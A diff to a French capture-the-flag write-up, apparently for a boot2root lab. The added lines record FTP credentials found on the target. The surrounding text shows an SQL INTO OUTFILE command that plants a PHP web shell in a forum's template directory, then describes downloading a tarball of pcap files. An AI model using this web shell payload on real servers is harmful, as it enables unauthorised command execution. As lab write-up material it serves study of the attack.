@@ -8,6 +8,9 @@ Nous pouvons trouver l'arborescence de mylittleforum sur son github. Finalement 
 On peut upload un shell avec cette command.
 SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"
 nous pouvons telecharger les identifiant du ftp dans /home/LOOKATME
+lmezard
+G!@M6f4Eatau{sF"
+
 Avec ces identifiant nous pouvont ensuite telecharger une tarball fun
 Cette tarball contenait un dossier ft_fun qui conténer a son tour des fichier pcap.
 Dans chaque fichier pcap il y avait un comment qui préciser l'order de ce fichier par rapport au autre. 
